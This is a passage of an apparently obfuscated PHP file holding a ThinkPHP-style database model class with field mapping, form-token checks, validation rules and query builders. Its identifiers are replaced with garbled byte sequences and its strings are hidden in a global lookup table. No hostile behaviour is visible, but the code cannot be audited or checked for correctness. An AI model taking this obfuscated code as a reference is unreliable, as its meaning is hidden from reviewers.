_afterFind(&$àãºÌ®Ü, $”ĞøÔµ“) { } protected function returnResult($¦æù´Ÿ€, $”ÛõÆœÊ = '') { $¿—’µ½° =& $_SERVER[ê‘³Æ±]; if ($”ÛõÆœÊ) { if (is_callable($”ÛõÆœÊ)) { return call_user_func($”ÛõÆœÊ, $¦æù´Ÿ€); } switch (strtolower($”ÛõÆœÊ)) { case $¿—’µ½°[291]: return json_encode($¦æù´Ÿ€); case $¿—’µ½°[292]: return xml_encode($¦æù´Ÿ€); } } return $¦æù´Ÿ€; } public function parseFieldsMap($ûèõ¡å, $ÚŸë»¤Ï = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÆäÆä™ñ => $Ÿ‚¢Ççæ) { if ($ÚŸë»¤Ï == 1) { if (isset($ûèõ¡å[$Ÿ‚¢Ççæ])) { $ûèõ¡å[$ÆäÆä™ñ] = $ûèõ¡å[$Ÿ‚¢Ççæ]; unset($ûèõ¡å[$Ÿ‚¢Ççæ]); } } else { if (isset($ûèõ¡å[$ÆäÆä™ñ])) { $ûèõ¡å[$Ÿ‚¢Ççæ] = $ûèõ¡å[$ÆäÆä™ñ]; unset($ûèõ¡å[$ÆäÆä™ñ]); } } } } return $ûèõ¡å; } public function setField($‰šä¥÷, $ÕÁĞÚ·Š = '') { if (is_array($‰šä¥÷)) { $ê²ëÔ¨¶ = $‰šä¥÷; } else { $ê²ëÔ¨¶[$‰šä¥÷] = $ÕÁĞÚ·Š; } return $this->save($ê²ëÔ¨¶); } public function setAdd($³Æ‘ ¤º, $§À¨¦ÊÍ = 1) { $³÷íä”œ =& $_SERVER[ê‘³Æ±]; $©Ñ×ë™º = $³Æ‘ ¤º . $³÷íä”œ[293] . $§À¨¦ÊÍ; if ($§À¨¦ÊÍ < 0) { $©Ñ×ë™º = $³Æ‘ ¤º . $§À¨¦ÊÍ; } return $this->setField($³Æ‘ ¤º, array($³÷íä”œ[294], $©Ñ×ë™º)); } public function getField($¦•…¾, $ˆ½¼²´§ = null) { $­ƒ©Ÿä =& $_SERVER[ê‘³Æ±]; $Æç˜Ÿ¥¸[$­ƒ©Ÿä[270]] = $¦•…¾; $Æç˜Ÿ¥¸ = $this->_parseOptions($Æç˜Ÿ¥¸); $¦•…¾ = trim($¦•…¾); if (strpos($¦•…¾, $­ƒ©Ÿä[50])) { if (!isset($Æç˜Ÿ¥¸[$­ƒ©Ÿä[289]])) { $Æç˜Ÿ¥¸[$­ƒ©Ÿä[289]] = is_numeric($ˆ½¼²´§) ? $ˆ½¼²´§ : $­ƒ©Ÿä[12]; } $İŒë˜ÆÂ = $this->db->select($Æç˜Ÿ¥¸); if (!empty($İŒë˜ÆÂ)) { $ƒşÔ¶áô = explode($­ƒ©Ÿä[50], $¦•…¾); $¦•…¾ = array_keys($İŒë˜ÆÂ[0]); $ì‘Ç™¯ = array_shift($¦•…¾); $¨¯Ê¶’® = array_shift($¦•…¾); $õíÚÜİ­ = array(); $ÌúõÏğ£ = count($ƒşÔ¶áô); foreach ($İŒë˜ÆÂ as $ı€ç·œ¦) { $‚•Èõß = $ı€ç·œ¦[$ì‘Ç™¯]; if (2 == $ÌúõÏğ£) { $õíÚÜİ­[$‚•Èõß] = $ı€ç·œ¦[$¨¯Ê¶’®]; } else { $õíÚÜİ­[$‚•Èõß] = is_string($ˆ½¼²´§) ? implode($ˆ½¼²´§, $ı€ç·œ¦) : $ı€ç·œ¦; } } return $õíÚÜİ­; } } else { if (!0 !== $ˆ½¼²´§) { $Æç˜Ÿ¥¸[$­ƒ©Ÿä[289]] = is_numeric($ˆ½¼²´§) ? $ˆ½¼²´§ : 1; } if ($ˆ½¼²´§ === $­ƒ©Ÿä[252]) { unset($Æç˜Ÿ¥¸[$­ƒ©Ÿä[289]]); } $ı€ç·œ¦ = $this->db->select($Æç˜Ÿ¥¸); if (!empty($ı€ç·œ¦)) { if ($ˆ½¼²´§ === $­ƒ©Ÿä[252]) { return reset($ı€ç·œ¦[0]); } if (!0 !== $ˆ½¼²´§ && 1 == $Æç˜Ÿ¥¸[$­ƒ©Ÿä[289]]) { return reset($ı€ç·œ¦[0]); } foreach ($ı€ç·œ¦ as $ÎŞªç³ñ) { $üÒÙÌÔ×[] = $ÎŞªç³ñ[$¦•…¾]; } return $üÒÙÌÔ×; } } return null; } public function create($–¤úŒ´ = '', $ƒ´‡ªÔâ = '') { $ìôŸÒà  =& $_SERVER[ê‘³Æ±]; if (empty($–¤úŒ´)) { $–¤úŒ´ = $_POST; } elseif (is_object($–¤úŒ´)) { $–¤úŒ´ = get_object_vars($–¤úŒ´); } if (empty($–¤úŒ´) || !is_array($–¤úŒ´)) { $this->error = think_lang($ìôŸÒà [268]); return !1; } $–¤úŒ´ = $this->parseFieldsMap($–¤úŒ´, 0); $ƒ´‡ªÔâ = $ƒ´‡ªÔâ ? $ƒ´‡ªÔâ : (!empty($–¤úŒ´[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ìôŸÒà [270]])) { $æõùöà» = $this->options[$ìôŸÒà [270]]; unset($this->options[$ìôŸÒà [270]]); } elseif ($ƒ´‡ªÔâ == THINK_MODEL_INSERT && isset($this->insertFields)) { $æõùöà» = $this->insertFields; } elseif ($ƒ´‡ªÔâ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $æõùöà» = $this->updateFields; } if (isset($æõùöà»)) { if (is_string($æõùöà»)) { $æõùöà» = explode($ìôŸÒà [50], $æõùöà»); } if (think_config($ìôŸÒà [295])) { $æõùöà»[] = think_config($ìôŸÒà [296]); } foreach ($–¤úŒ´ as $›¼ˆÓÑ => $—üîíÛ”) { if (!in_array($›¼ˆÓÑ, $æõùöà»)) { unset($–¤úŒ´[$›¼ˆÓÑ]); } } } if (!$this->autoValidation($–¤úŒ´, $ƒ´‡ªÔâ)) { return !1; } if (!$this->autoCheckToken($–¤úŒ´)) { $this->error = think_lang($ìôŸÒà [297]); return !1; } if ($this->autoCheckFields) { $æõùöà» = $this->getDbFields(); foreach ($–¤úŒ´ as $›¼ˆÓÑ => $—üîíÛ”) { if (!in_array($›¼ˆÓÑ, $æõùöà»)) { unset($–¤úŒ´[$›¼ˆÓÑ]); } elseif (MAGIC_QUOTES_GPC && is_string($—üîíÛ”)) { $–¤úŒ´[$›¼ˆÓÑ] = stripslashes($—üîíÛ”); } } } $this->autoOperation($–¤úŒ´, $ƒ´‡ªÔâ); $this->data = $–¤úŒ´; return $–¤úŒ´; } public function autoCheckToken($ÌéäÇ¯) { $íÒ§Ùµ =& $_SERVER[ê‘³Æ±]; if (isset($this->options[$íÒ§Ùµ[298]]) && !$this->options[$íÒ§Ùµ[298]]) { return !0; } if (think_config($íÒ§Ùµ[295])) { $†õ‚™éç = think_config($íÒ§Ùµ[296]); if (!isset($ÌéäÇ¯[$†õ‚™éç]) || Session::get($†õ‚™éç)) { return !1; } list($ôÌÉµ‹†, $´äß–½š) = explode($íÒ§Ùµ[11], $ÌéäÇ¯[$†õ‚™éç]); if ($´äß–½š && Session::get($†õ‚™éç . $íÒ§Ùµ[10] . $ôÌÉµ‹†) === $´äß–½š) { Session::remove($†õ‚™éç . $íÒ§Ùµ[10] . $ôÌÉµ‹†); return !0; } if (think_config($íÒ§Ùµ[299])) { Session::remove($†õ‚™éç . $íÒ§Ùµ[10] . $ôÌÉµ‹†); } return !1; } return !0; } public function regex($ß²¡…ö¤, $¢óº…Ñ¡) { $¡ÊÔ† =& $_SERVER[ê‘³Æ±]; $¿µâšÎİ = array($¡ÊÔ†[300] => $¡ÊÔ†[301], $¡ÊÔ†[302] => $¡ÊÔ†[303], $¡ÊÔ†[304] => $¡ÊÔ†[305], $¡ÊÔ†[306] => $¡ÊÔ†[307], $¡ÊÔ†[308] => $¡ÊÔ†[309], $¡ÊÔ†[310] => $¡ÊÔ†[311], $¡ÊÔ†[312] => $¡ÊÔ†[313], $¡ÊÔ†[287] => $¡ÊÔ†[314], $¡ÊÔ†[315] => $¡ÊÔ†[316]); if (isset($¿µâšÎİ[strtolower($¢óº…Ñ¡)])) { $¢óº…Ñ¡ = $¿µâšÎİ[strtolower($¢óº…Ñ¡)]; } return preg_match($¢óº…Ñ¡, $ß²¡…ö¤) === 1; } private function autoOperation(&$¨ıŠ”ƒ¤, $Æí’ÄŞ§) { $˜°Øš”‡ =& $_SERVER[ê‘³Æ±]; if (!empty($this->options[$˜°Øš”‡[317]])) { $«»áäÚŠ = $this->options[$˜°Øš”‡[317]]; unset($this->options[$˜°Øš”‡[317]]); } elseif (!empty($this->_auto)) { $«»áäÚŠ = $this->_auto; } if (isset($«»áäÚŠ)) { foreach ($«»áäÚŠ as $‘ß¼èáï) { if (empty($‘ß¼èáï[2])) { $‘ß¼èáï[2] = THINK_MODEL_INSERT; } if ($Æí’ÄŞ§ == $‘ß¼èáï[2] || $‘ß¼èáï[2] == THINK_MODEL_BOTH) { switch (trim($‘ß¼èáï[3])) { case $˜°Øš”‡[318]: case $˜°Øš”‡[319]: $üïÙ¯ì = isset($‘ß¼èáï[4]) ? (array) $‘ß¼èáï[4] : array(); if (isset($¨ıŠ”ƒ¤[$‘ß¼èáï[0]])) { array_unshift($üïÙ¯ì, $¨ıŠ”ƒ¤[$‘ß¼èáï[0]]); } if ($˜°Øš”‡[318] == $‘ß¼èáï[3]) { $¨ıŠ”ƒ¤[$‘ß¼èáï[0]] = call_user_func_array($‘ß¼èáï[1], $üïÙ¯ì); } else { $¨ıŠ”ƒ¤[$‘ß¼èáï[0]] = call_user_func_array(array(&$this, $‘ß¼èáï[1]), $üïÙ¯ì); } break; case $˜°Øš”‡[270]: $¨ıŠ”ƒ¤[$‘ß¼èáï[0]] = $¨ıŠ”ƒ¤[$‘ß¼èáï[1]]; break; case $˜°Øš”‡[320]: if ($˜°Øš”‡[12] === $¨ıŠ”ƒ¤[$‘ß¼èáï[0]]) { unset($¨ıŠ”ƒ¤[$‘ß¼èáï[0]]); } break; case $˜°Øš”‡[321]: default: $¨ıŠ”ƒ¤[$‘ß¼èáï[0]] = $‘ß¼èáï[1]; } if (!1 === $¨ıŠ”ƒ¤[$‘ß¼èáï[0]]) { unset($¨ıŠ”ƒ¤[$‘ß¼èáï[0]]); } } } } return $¨ıŠ”ƒ¤; } protected function autoValidation($÷¾¬•ãÙ, $ºÜòÏ˜Ú) { $ïÖßôÚ =& $_SERVER[ê‘³Æ±]; if (!empty($this->options[$ïÖßôÚ[322]])) { $”‹°¼Ïª = $this->options[$ïÖßôÚ[322]]; unset($this->options[$ïÖßôÚ[322]]); } elseif (!empty($this->_validate)) { $”‹°¼Ïª = $this->_validate; } if (isset($”‹°¼Ïª)) { if ($this->patchValidate) { $this->error = array(); } foreach ($”‹°¼Ïª as $ÏñØØÏ¢ => $ƒ¨¡«×) { if (empty($ƒ¨¡«×[5]) || $ƒ¨¡«×[5] == THINK_MODEL_BOTH || $ƒ¨¡«×[5] == $ºÜòÏ˜Ú) { if (0 == strpos($ƒ¨¡«×[2], $ïÖßôÚ[323]) && strpos($ƒ¨¡«×[2], $ïÖßôÚ[324])) { $ƒ¨¡«×[2] = think_lang(substr($ƒ¨¡«×[2], 2, -1)); } $ƒ¨¡«×[3] = isset($ƒ¨¡«×[3]) ? $ƒ¨¡«×[3] : THINK_EXISTS_VALIDATE; $ƒ¨¡«×[4] = isset($ƒ¨¡«×[4]) ? $ƒ¨¡«×[4] : $ïÖßôÚ[325]; switch ($ƒ¨¡«×[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($÷¾¬•ãÙ, $ƒ¨¡«×)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ïÖßôÚ[12] != trim($÷¾¬•ãÙ[$ƒ¨¡«×[0]])) { if (!1 === $this->_validationField($÷¾¬•ãÙ, $ƒ¨¡«×)) { return !1; } } break; default: if (isset($÷¾¬•ãÙ[$ƒ¨¡«×[0]])) { if (!1 === $this->_validationField($÷¾¬•ãÙ, $ƒ¨¡«×)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($à³Êã´ƒ, $ñ«­åÎ®) { if (!1 === $this->_validationFieldItem($à³Êã´ƒ, $ñ«­åÎ®)) { if ($this->patchValidate) { $this->error[$ñ«­åÎ®[0]] = $ñ«­åÎ®[2]; } else { $this->error = $ñ«­åÎ®[2]; return !1; } } return; } protected function _validationFieldItem($ŒÍò¯©, $Ü‘äÌ«£) { $¼ş–³Ä =& $_SERVER[ê‘³Æ±]; switch (strtolower(trim($Ü‘äÌ«£[4]))) { case $¼ş–³Ä[318]: case $¼ş–³Ä[319]: $ÏÒÜÊ‘Ğ = isset($Ü‘äÌ«£[6]) ? (array) $Ü‘äÌ«£[6] : array(); if (is_string($Ü‘äÌ«£[0]) && strpos($Ü‘äÌ«£[0], $¼ş–³Ä[50])) { $Ü‘äÌ«£[0] = explode($¼ş–³Ä[50], $Ü‘äÌ«£[0]); } if (is_array($Ü‘äÌ«£[0])) { foreach ($Ü‘äÌ«£[0] as $¥âÃÙš) { $µ‚çåÕş[$¥âÃÙš] = $ŒÍò¯©[$¥âÃÙš]; } array_unshift($ÏÒÜÊ‘Ğ, $µ‚çåÕş); } else { array_unshift($ÏÒÜÊ‘Ğ, $ŒÍò¯©[$Ü‘äÌ«£[0]]); } if ($¼ş–³Ä[318] == $Ü‘äÌ«£[4]) { return call_user_func_array($Ü‘äÌ«£[1], $ÏÒÜÊ‘Ğ); } else { return call_user_func_array(array(&$this, $Ü‘äÌ«£[1]), $ÏÒÜÊ‘Ğ); } case $¼ş–³Ä[326]: return $ŒÍò¯©[$Ü‘äÌ«£[0]] == $ŒÍò¯©[$Ü‘äÌ«£[1]]; case $¼ş–³Ä[327]: if (is_string($Ü‘äÌ«£[0]) && strpos($Ü‘äÌ«£[0], $¼ş–³Ä[50])) { $Ü‘äÌ«£[0] = explode($¼ş–³Ä[50], $Ü‘äÌ«£[0]); } $÷²äÚ½ = array(); if (is_array($Ü‘äÌ«£[0])) { foreach ($Ü‘äÌ«£[0] as $¥âÃÙš) { $÷²äÚ½[$¥âÃÙš] = $ŒÍò¯©[$¥âÃÙš]; } } else { $÷²äÚ½[$Ü‘äÌ«£[0]] = $ŒÍò¯©[$Ü‘äÌ«£[0]]; } if (!empty($ŒÍò¯©[$this->getPk()])) { $÷²äÚ½[$this->getPk()] = array($¼ş–³Ä[328], $ŒÍò¯©[$this->getPk()]); } if ($this->where($÷²äÚ½)->find()) { return !1; } return !0; default: return $this->check($ŒÍò¯©[$Ü‘äÌ«£[0]], $Ü‘äÌ«£[1], $Ü‘äÌ«£[4]); } } public function check($”£òµ€ˆ, $€î·îÂà, $æİßúğ™ = "\162\145\147\x65\170") { $±¦üúÎ“ =& $_SERVER[ê‘³Æ±]; $æİßúğ™ = strtolower(trim($æİßúğ™)); switch ($æİßúğ™) { case $±¦üúÎ“[7]: case $±¦üúÎ“[329]: $Ê‹‡§½Ù = is_array($€î·îÂà) ? $€î·îÂà : explode($±¦üúÎ“[50], $€î·îÂà); return $æİßúğ™ == $±¦üúÎ“[7] ? in_array($”£òµ€ˆ, $Ê‹‡§½Ù) : !in_array($”£òµ€ˆ, $Ê‹‡§½Ù); case $±¦üúÎ“[330]: case $±¦üúÎ“[331]: if (is_array($€î·îÂà)) { $»Ğâƒ€î = $€î·îÂà[0]; $”÷×ãÄË = $€î·îÂà[1]; } else { list($»Ğâƒ€î, $”÷×ãÄË) = explode($±¦üúÎ“[50], $€î·îÂà); } return $æİßúğ™ == $±¦üúÎ“[330] ? $”£òµ€ˆ >= $»Ğâƒ€î && $”£òµ€ˆ <= $”÷×ãÄË : $”£òµ€ˆ < $»Ğâƒ€î || $”£òµ€ˆ > $”÷×ãÄË; case $±¦üúÎ“[332]: case $±¦üúÎ“[333]: return $æİßúğ™ == $±¦üúÎ“[332] ? $”£òµ€ˆ == $€î·îÂà : $”£òµ€ˆ != $€î·îÂà; case $±¦üúÎ“[334]: $½¶»¼º£ = mb_strlen($”£òµ€ˆ, $±¦üúÎ“[335]); if (strpos($€î·îÂà, $±¦üúÎ“[50])) { list($»Ğâƒ€î, $”÷×ãÄË) = explode($±¦üúÎ“[50], $€î·îÂà); return $½¶»¼º£ >= $»Ğâƒ€î && $½¶»¼º£ <= $”÷×ãÄË; } else { return $½¶»¼º£ == $€î·îÂà; } case $±¦üúÎ“[336]: list($…Œºíã°, $ˆæ‹ Ôú) = explode($±¦üúÎ“[50], $€î·îÂà); if (!is_numeric($…Œºíã°)) { $…Œºíã° = strtotime($…Œºíã°); } if (!is_numeric($ˆæ‹ Ôú)) { $ˆæ‹ Ôú = strtotime($ˆæ‹ Ôú); } return NOW_TIME >= $…Œºíã° && NOW_TIME <= $ˆæ‹ Ôú; case $±¦üúÎ“[337]: return in_array(get_client_ip(), explode($±¦üúÎ“[50], $€î·îÂà)); case $±¦üúÎ“[338]: return !in_array(get_client_ip(), explode($±¦üúÎ“[50], $€î·îÂà)); case $±¦üúÎ“[325]: default: return $this->regex($”£òµ€ˆ, $€î·îÂà); } } public function query($ÄŸÎÂÆÎ, $ÙÈûä·Ä = false) { $Åú¸æ©˜ =& $_SERVER[ê‘³Æ±]; if (!is_bool($ÙÈûä·Ä) && !is_array($ÙÈûä·Ä)) { $ÙÈûä·Ä = func_get_args(); array_shift($ÙÈûä·Ä); } $ÄŸÎÂÆÎ = str_replace(array($Åú¸æ©˜[228], $Åú¸æ©˜[339]), $Åú¸æ©˜[53], $ÄŸÎÂÆÎ); $ÄŸÎÂÆÎ = $this->parseSql($ÄŸÎÂÆÎ, $ÙÈûä·Ä); return $this->db->query($ÄŸÎÂÆÎ); } public function execute($¦Ê„üÑé, $´º‡“ƒí = false) { if (!is_bool($´º‡“ƒí) && !is_array($´º‡“ƒí)) { $´º‡“ƒí = func_get_args(); array_shift($´º‡“ƒí); } $¦Ê„üÑé = $this->parseSql($¦Ê„üÑé, $´º‡“ƒí); return $this->db->execute($¦Ê„üÑé); } protected function parseSql($‰Àª©÷‡, $ºó²Â) { $àø½î• =& $_SERVER[ê‘³Æ±]; if (!0 === $ºó²Â) { $ƒ‚¾ äò = $this->_parseOptions(); $‰Àª©÷‡ = $this->db->parseSql($‰Àª©÷‡, $ƒ‚¾ äò); } elseif (is_array($ºó²Â)) { $ºó²Â = array_map(array($this->db, $àø½î•[340]), $ºó²Â); $‰Àª©÷‡ = vsprintf($‰Àª©÷‡, $ºó²Â); } else { $‰Àª©÷‡ = strtr($‰Àª©÷‡, array($àø½î•[341] => $this->getTableName(), $àø½î•[342] => think_config($àø½î•[241]))); } $this->db->setModel($this->name); return $‰Àª©÷‡; } public function db($ƒˆ—Ê¾æ = '', $Ô¿´¤½… = '', $‚øÓí¦ú = array()) { $û†„¿ =& $_SERVER[ê‘³Æ±]; if ($û†„¿[12] === $ƒˆ—Ê¾æ && $this->db) { return $this->db; } static $ê­øşçò = array(); static $€ªñÂú‰ = array(); if (!isset($€ªñÂú‰[$ƒˆ—Ê¾æ]) || isset($€ªñÂú‰[$ƒˆ—Ê¾æ]) && $Ô¿´¤½… && $ê­øşçò[$ƒˆ—Ê¾æ] != $Ô¿´¤½…) { if (!empty($Ô¿´¤½…) && is_string($Ô¿´¤½…) && !1 === strpos($Ô¿´¤½…, $û†„¿[8])) { $Ô¿´¤½… = think_config($Ô¿´¤½…); } $ƒˆ—Ê¾æ = think_guid($Ô¿´¤½…); $€ªñÂú‰[$ƒˆ—Ê¾æ] = Db::getInstance($Ô¿´¤½…); } elseif (NULL === $Ô¿´¤½…) { $€ªñÂú‰[$ƒˆ—Ê¾æ]->close(); unset($€ªñÂú‰[$ƒˆ—Ê¾æ]); return; } if (!empty($‚øÓí¦ú)) { if (is_string($‚øÓí¦ú)) { parse_str($‚øÓí¦ú, $‚øÓí¦ú); } foreach ($‚øÓí¦ú as $Í˜ÛÊ² => $×é™¶€€) { $this->setProperty($Í˜ÛÊ², $×é™¶€€); } } $ê­øşçò[$ƒˆ—Ê¾æ] = $Ô¿´¤½…; $this->db = $€ªñÂú‰[$ƒˆ—Ê¾æ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $»ºÒ“›³ = get_class($this); if ($»ºÒ“›³ == $_SERVER[ê‘³Æ±][343]) { return $this->name; } $this->name = substr($»ºÒ“›³, 0, -5); } return $this->name; } public function getTableName() { $àÖ… ä‘ =& $_SERVER[ê‘³Æ±]; if (empty($this->trueTableName)) { $ãıÇÆÆø = !empty($this->tablePrefix) ? $this->tablePrefix : $àÖ… ä‘[12]; if (!empty($this->tableName)) { $ãıÇÆÆø .= $this->tableName; } else { $ãıÇÆÆø .= think_parse_name($this->name); } $this->trueTableName = strtolower($ãıÇÆÆø); } return (!empty($this->dbName) ? $this->dbName . $àÖ… ä‘[10] : $àÖ… ä‘[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $³ı›Â—¥ =& $_SERVER[ê‘³Æ±]; return isset($this->fields[$³ı›Â—¥[248]]) ? $this->fields[$³ı›Â—¥[248]] : $this->pk; } public function getDbFields() { $éğ½´Ú¹ =& $_SERVER[ê‘³Æ±]; if (isset($this->options[$éğ½´Ú¹[276]])) { $Ì·Ó¨Ê¥ = $this->db->getFields($this->options[$éğ½´Ú¹[276]]); return $Ì·Ó¨Ê¥ ? array_keys($Ì·Ó¨Ê¥) : !1; } if ($this->fields) { $Ì·Ó¨Ê¥ = $this->fields; unset($Ì·Ó¨Ê¥[$éğ½´Ú¹[247]], $Ì·Ó¨Ê¥[$éğ½´Ú¹[248]], $Ì·Ó¨Ê¥[$éğ½´Ú¹[249]], $Ì·Ó¨Ê¥[$éğ½´Ú¹[246]]); return $Ì·Ó¨Ê¥; } return !1; } public function data($ñî£»È© = '') { $¢Ï‘Éü =& $_SERVER[ê‘³Æ±]; if ($¢Ï‘Éü[12] === $ñî£»È© && !empty($this->data)) { return $this->data; } if (is_object($ñî£»È©)) { $ñî£»È© = get_object_vars($ñî£»È©); } elseif (is_string($ñî£»È©)) { parse_str($ñî£»È©, $ñî£»È©); } elseif (!is_array($ñî£»È©)) { think_exception(think_lang($¢Ï‘Éü[268])); } $this->data = $ñî£»È©; return $this; } public function join($Ş°ìÌö²) { $©İù”’• =& $_SERVER[ê‘³Æ±]; if (is_array($Ş°ìÌö²)) { $this->options[$©İù”’•[279]] = $Ş°ìÌö²; } elseif (!empty($Ş°ìÌö²)) { $this->options[$©İù”’•[279]][] = $Ş°ìÌö²; } return $this; } public function union($ËÊ«İïÔ, $ºÓüã†î = false) { $Ø·â€Ë  =& $_SERVER[ê‘³Æ±]; if (empty($ËÊ«İïÔ)) { return $this; } if ($ºÓüã†î) { $this->options[$Ø·â€Ë [344]][$Ø·â€Ë [345]] = !0; } if (is_object($ËÊ«İïÔ)) { $ËÊ«İïÔ = get_object_vars($ËÊ«İïÔ); } if (is_string($ËÊ«İïÔ)) { $˜Ğûé–û = $ËÊ«İïÔ; } elseif (is_array($ËÊ«İïÔ)) { if (isset($ËÊ«İïÔ[0])) { $this->options[$Ø·â€Ë [344]] = array_merge($this->options[$Ø·â€Ë [344]], $ËÊ«İïÔ); return $this; } else { $˜Ğûé–û = $ËÊ«İïÔ; } } else { think_exception(think_lang($Ø·â€Ë [268])); } $this->options[$Ø·â€Ë [344]][] = $˜Ğûé–û; return $this; } public function cache($Î¿»¬Ç = true, $¸­íëö = null, $­™ñàëŸ = '') { $úéêÇÎÇ =& $_SERVER[ê‘³Æ±]; if (!1 !== $Î¿»¬Ç) { $this->options[$úéêÇÎÇ[346]] = array($úéêÇÎÇ[95] => $Î¿»¬Ç, $úéêÇÎÇ[336] => $¸­íëö, $úéêÇÎÇ[33] => $­™ñàëŸ); } return $this; } public function field($ÙÍ­·ğ‹, $á³Ú³‡ = false) { $†Ÿ×÷”º =& $_SERVER[ê‘³Æ±]; if (!0 === $ÙÍ­·ğ‹) { $¹¯·Ú§ = $this->getDbFields(); $ÙÍ­·ğ‹ = $¹¯·Ú§ ? $¹¯·Ú§ : $†Ÿ×÷”º[183]; } elseif ($á³Ú³‡) { if (is_string($ÙÍ­·ğ‹)) { $ÙÍ­·ğ‹ = explode($†Ÿ×÷”º[50], $ÙÍ­·ğ‹); } $¹¯·Ú§ = $this->getDbFields(); $ÙÍ­·ğ‹ = $¹¯·Ú§ ? array_diff($¹¯·Ú§, $ÙÍ­·ğ‹) : $ÙÍ­·ğ‹; } $this->options[$†Ÿ×÷”º[270]] = $ÙÍ­·ğ‹; return $this; } public function scope($¾ÚÂ¹òß = '', $§ÔÒ¹ÁÜ = NULL) { $ğ‘±¦Ïş =& $_SERVER[ê‘³Æ±]; if ($ğ‘±¦Ïş[12] === $¾ÚÂ¹òß) { if (isset($this->_scope[$ğ‘±¦Ïş[37]])) { $š—Àà·¹ = $this->_scope[$ğ‘±¦Ïş[37]]; } else { return $this; } } elseif (is_string($¾ÚÂ¹òß)) { $êş€Ä×ş = explode($ğ‘±¦Ïş[50], $¾ÚÂ¹òß); $š—Àà·¹ = array(); foreach ($êş€Ä×ş as $³•ÕƒËà) { if (!isset($this->_scope[$³•ÕƒËà])) { continue; } $š—Àà·¹ = array_merge($š—Àà·¹, $this->_scope[$³•ÕƒËà]); } if (!empty($§ÔÒ¹ÁÜ) && is_array($§ÔÒ¹ÁÜ)) { $š—Àà·¹ = array_merge($š—Àà·¹, $§ÔÒ¹ÁÜ); } } elseif (is_array($¾ÚÂ¹òß)) { $š—Àà·¹ = $¾ÚÂ¹òß; } if (is_array($š—Àà·¹) && !empty($š—Àà·¹)) { $this->options = array_merge($this->options, array_change_key_case($š—Àà·¹)); } return $this; } public function where($©äÃˆªŠ, $œ´‚Û = null) { $èğËÅ½Ô =& $_SERVER[ê‘³Æ±]; if (!is_null($œ´‚Û) && is_string($©äÃˆªŠ)) { if (!is_array($œ´‚Û)) { $œ´‚Û = func_get_args(); array_shift($œ´‚Û); } $œ´‚Û = array_map(array($this->db, $èğËÅ½Ô[340]), $œ´‚Û); $©äÃˆªŠ = vsprintf($©äÃˆªŠ, $œ´‚Û); } elseif (is_object($©äÃˆªŠ)) { $©äÃˆªŠ = get_object_vars($©äÃˆªŠ); } elseif (is_array($©äÃˆªŠ)) { foreach ($©äÃˆªŠ as $Â£§ËÁ’ => $ÏùÓÒô“) { if ((is_numeric($Â£§ËÁ’) || !$Â£§ËÁ’) && is_string($ÏùÓÒô“)) { if (strpos($ÏùÓÒô“, $èğËÅ½Ô[347]) === 0) { continue; } think_trace($èğËÅ½Ô[348], $èğËÅ½Ô[12], $èğËÅ½Ô[49]); die; } } } if (is_string($©äÃˆªŠ) && $èğËÅ½Ô[12] != $©äÃˆªŠ) { $™«¼ÀàŠ = array(); $™«¼ÀàŠ[$èğËÅ½Ô[349]] = $©äÃˆªŠ; $©äÃˆªŠ = $™«¼ÀàŠ; } if (isset($this->options[$èğËÅ½Ô[272]])) { $this->options[$èğËÅ½Ô[272]] = array_merge($this->options[$èğËÅ½Ô[272]], $©äÃˆªŠ); } else { $this->options[$èğËÅ½Ô[272]] = $©äÃˆªŠ; } return $this; } public function limit($ĞÓ”ı×ş, $ØÂÌÓêä = null) { $êÛ°Áç =& $_SERVER[ê‘³Æ±]; $this->options[$êÛ°Áç[289]] = is_null($ØÂÌÓêä) ? $ĞÓ”ı×ş : $ĞÓ”ı×ş . $êÛ°Áç[50] . $ØÂÌÓêä; return $this; } public function page($çáÎŸê, $æ³Óîë = null) { $·¤ÔÊà¹ =& $_SERVER[ê‘³Æ±]; $this->options[$·¤ÔÊà¹[350]] = is_null($æ³Óîë) ? $çáÎŸê : $çáÎŸê . $·¤ÔÊà¹[50] . $æ³Óîë; return $this; } public function comment($åÌØáıÉ) { $this->options[$_SERVER[ê‘³Æ±][351]] = $åÌØáıÉ; return $this; } public function setProperty($˜¾¹éü±, $°á·ÛÑ™) { if (property_exists($this, $˜¾¹éü±)) { $this->{$˜¾¹éü±} = $°á·ÛÑ™; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\171\124\151\155\x65", "\164\151\x6d\145", "\151\156\x73\145\162\x74\x2c\165\x70\144\x61\x74\x65", "\x66\x75\156\143\x74\151\157\156"), array("\x63\x72\x65\141\x74\x65\124\x69\x6d\145", "\164\x69\155\x65", "\151\x6e\x73\x65\162\164", "\146\165\x6e\x63\164\151\157\x6e")); public function setDataAuto($¶„›ˆã™) { $this->dataAuto = $¶„›ˆã™; } public function __construct($üÌÕ‚™Ú = '', $ùÊ‘¥œÜ = '', $¹Âù°ß = '') { parent::__construct($üÌÕ‚™Ú, $ùÊ‘¥œÜ, $¹Âù°ß); } protected $tableMeta = array(); protected function _beforeInsert(&$¸†«Ùòƒ, $ÕìşœÁú) { $ì‘­Ñ¸Î =& $_SERVER[ê‘³Æ±]; if (!$this->checkDataAutoHas($ì‘­Ñ¸Î[352])) { return; } $this->dataBeforeFilter($¸†«Ùòƒ, $ì‘­Ñ¸Î[352]); } protected function _beforeUpdate(&$”ï©ÆØ±, $ÏÓÆûÓ) { $ï”­»Ë¥ =& $_SERVER[ê‘³Æ±]; if (!$this->checkDataAutoHas($ï”­»Ë¥[353])) { return; } $this->dataBeforeFilter($”ï©ÆØ±, $ï”­»Ë¥[353]); } protected function _afterSelect(&$ô¶¦¡ÔÛ, 